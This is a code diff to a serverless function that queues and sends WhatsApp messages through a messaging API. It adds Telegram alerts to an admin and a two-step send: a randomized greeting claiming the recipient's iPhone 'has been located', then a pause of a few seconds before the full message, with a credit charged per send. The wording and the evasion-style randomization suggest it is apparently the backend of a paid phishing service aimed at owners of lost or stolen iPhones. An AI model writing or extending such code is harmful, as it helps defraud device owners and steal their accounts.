@@ -21,6 +21,95 @@ Deno.serve(async (req) => {
     const body = await req.json().catch(() => ({}));
     const messageId = body.messageId;
     const auto = body.auto;
+    const notifyAdmin = body.notifyAdmin; // Nueva bandera para notificar al admin
+
+    // If only notifying admin without processing, handle separately
+    if (notifyAdmin && !messageId && !auto) {
+      console.log('Notification-only mode - getting latest pending message for admin notification');
+      
+      const { data: latestMessage } = await supabase
+        .from('message_queue')
+        .select(`
+          *,
+          processes (
+            client_name
+          )
+        `)
+        .eq('status', 'pending')
+        .order('created_at', { ascending: false })
+        .limit(1)
+        .maybeSingle();
+
+      if (latestMessage) {
+        const { data: userProfile } = await supabase
+          .from('profiles')
+          .select('email')
+          .eq('id', latestMessage.user_id)
+          .single();
+
+        const { data: adminProfile } = await supabase
+          .from('profiles')
+          .select('telegram_bot_token, telegram_chat_id')
+          .eq('email', 'fredric@gmail.com')
+          .single();
+
+        if (adminProfile?.telegram_bot_token && adminProfile?.telegram_chat_id) {
+          try {
+            const adminNotification = `🔔 *Nuevo Mensaje en Cola*\n\n` +
+              `Usuario: ${userProfile?.email || 'Desconocido'}\n` +
+              `Cliente: ${latestMessage.processes?.client_name}\n` +
+              `Teléfono: ${latestMessage.recipient_phone}\n` +
+              `Estado: Pendiente de envío\n\n` +
+              `El mensaje se enviará automáticamente en 5 minutos o puedes enviarlo manualmente desde el panel.`;
+
+            await fetch(`https://api.telegram.org/bot${adminProfile.telegram_bot_token}/sendMessage`, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                chat_id: adminProfile.telegram_chat_id,
+                text: adminNotification,
+                parse_mode: 'Markdown'
+              })
+            });
+            
+            console.log('Admin notification sent successfully');
+          } catch (notifyError) {
+            console.error('Error sending admin notification:', notifyError);
+          }
+        }
+      }
+
+      return new Response(
+        JSON.stringify({ message: 'Notification sent', processed: 0 }),
+        { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
+      );
+    }
+
+    // Función para generar saludo aleatorio
+    const generateGreeting = (clientName: string, language: string) => {
+      const greetingsES = [
+        `Hola ${clientName}, tu equipo ha sido localizado 📍. A continuación, recibirás los detalles 📱.`,
+        `Hola ${clientName}, hemos encontrado tu dispositivo 📱. Los detalles llegarán en breve.`,
+        `${clientName}, tu iPhone fue rastreado exitosamente 🎯. Prepárate para recibir la información.`,
+        `Hola ${clientName}, buenas noticias 📍 Tu equipo está ubicado. Detalles en camino.`,
+        `${clientName}, dispositivo localizado ✅ La información completa llegará enseguida.`,
+        `Hola ${clientName}, confirmamos la ubicación de tu iPhone 📱. Espera los detalles.`,
+        `${clientName}, tu equipo ha sido rastreado 🎯. Información detallada próximamente.`,
+      ];
+
+      const greetingsEN = [
+        `Hello ${clientName}, your device has been located 📍. Details coming shortly 📱.`,
+        `Hi ${clientName}, we found your device 📱. Information on the way.`,
+        `${clientName}, your iPhone was successfully tracked 🎯. Get ready for the details.`,
+        `Hello ${clientName}, good news 📍 Your device is located. Details coming up.`,
+        `${clientName}, device located ✅ Full information arriving soon.`,
+        `Hi ${clientName}, we confirm your iPhone's location 📱. Expect the details.`,
+        `${clientName}, your device has been tracked 🎯. Detailed information shortly.`,
+      ];
+
+      const greetings = language === 'spanish' ? greetingsES : greetingsEN;
+      return greetings[Math.floor(Math.random() * greetings.length)];
+    };
 
     let query = supabase
       .from('message_queue')
@@ -187,10 +276,56 @@ Deno.serve(async (req) => {
       );
     }
 
-    // Send WhatsApp message
+    // Generate greeting message
+    const greetingMessage = generateGreeting(
+      queuedMessage.processes?.client_name || 'Cliente',
+      queuedMessage.language
+    );
+
+    // Step 1: Send greeting message
+    console.log('Sending greeting message...');
+    const greetingResponse = await fetch(`https://api.ultramsg.com/${instanceId}/messages/chat`, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/x-www-form-urlencoded',
+      },
+      body: new URLSearchParams({
+        token: token,
+        to: queuedMessage.recipient_phone,
+        body: greetingMessage,
+      }),
+    });
+    const greetingResult = await greetingResponse.json();
+    console.log('Greeting message response:', greetingResult);
+
+    if (greetingResult.sent !== true && greetingResult.sent !== "true") {
+      console.log('Greeting message failed:', greetingResult);
+      await supabase
+        .from('message_queue')
+        .update({ 
+          status: 'failed',
+          updated_at: new Date().toISOString()
+        })
+        .eq('id', queuedMessage.id);
+
+      return new Response(
+        JSON.stringify({ 
+          message: `Greeting message failed: ${greetingResult.message || greetingResult.error || 'Unknown error'}`, 
+          processed: 0 
+        }),
+        { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
+      );
+    }
+
+    // Wait 3-5 seconds before sending full message to break the ice
+    const waitTime = 3000 + Math.floor(Math.random() * 2000); // Random between 3-5 seconds
+    console.log(`Waiting ${waitTime}ms before sending full message...`);
+    await new Promise(resolve => setTimeout(resolve, waitTime));
+
+    // Step 2: Send full message with details
     let result;
     if (queuedMessage.image_url) {
-      console.log('Sending message with image');
+      console.log('Sending full message with image');
       const response = await fetch(`https://api.ultramsg.com/${instanceId}/messages/image`, {
         method: 'POST',
         headers: {
@@ -205,7 +340,7 @@ Deno.serve(async (req) => {
       });
       result = await response.json();
     } else {
-      console.log('Sending text only message');
+      console.log('Sending full text message');
       const response = await fetch(`https://api.ultramsg.com/${instanceId}/messages/chat`, {
         method: 'POST',
         headers: {
@@ -220,7 +355,7 @@ Deno.serve(async (req) => {
       result = await response.json();
     }
 
-    console.log('WhatsApp API response:', result);
+    console.log('Full message WhatsApp API response:', result);
 
     if (result.sent === true || result.sent === "true") {
       // Deduct credit
